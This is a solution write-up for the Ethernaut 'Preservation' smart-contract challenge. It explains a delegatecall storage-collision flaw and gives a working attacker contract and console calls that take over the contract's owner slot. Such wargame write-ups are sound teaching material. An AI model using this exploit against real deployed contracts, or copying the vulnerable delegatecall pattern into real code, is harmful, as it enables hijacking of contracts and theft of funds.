# Ethernaut - Preservation - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

## Solution

The goal of this challenge is to become the `owner`.

If you don't have a solid understanding of `delegatecall` and storage collisions yet, [this blog post](https://blog.finxter.com/delegatecall-or-storage-collision-attack-on-smart-contracts/) is a great introduction.

We'll execute our attack via three steps:

1. Deploy an attacker contract with a `setTime()` function and design its storage layout such that a call to `setTime()` will lead to a collision with the level's `owner`.
2. Use either the `setFirstTime()` or the `setSecondTime()` function to set `timeZone1Library` to our attacker's address.
3. Use `setFirstTime()` to set `owner` to our EOA's address.

For step 1, we'll deploy the following attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    uint256 occupyFirstSlot = 42;
    uint256 occupySecondSlot = 42;
    uint256 owner;

    function setTime(uint256 _owner) external {
        owner = _owner;
    }
}
```

In my case, the address of the deployed `PreservationAttacker` reads 0x2124E3b48A11008d36171b9a7e8315fE572E341C.

Next, we can either use `setFirstTime()` or `setSecondTime()` to set `timeZone1Library` to this address. 
However, since those functions expect a `uint256` as their parameter, we must first convert the hex representation of our address to decimal via

```bash
cast to-dec 0x2124E3b48A11008d36171b9a7e8315fE572E341C
# Result: 189219358187588105730525764077460654362006008860
```

and subsequently use the Ethernaut console to call the setter:

```javascript
await contract.setFirstTime("189219358187588105730525764077460654362006008860")
```

Notice that we pass the big number as a string to avoid JavaScript-related overflow issues during the call.

With our `timeZone1Library` set to our attacker, we can now use `setFirstTime()` to set the `owner` to our EOA's address.
Assuming that this address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, we can first convert it to decimal representation

```bash
cast to-dec 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
# Result: 520786028573371803640530888255888666801131675076
```

and then make the call via the Ethernaut console

```javascript
await contract.setFirstTime("520786028573371803640530888255888666801131675076")
```

making us the `owner` and completing the challenge.
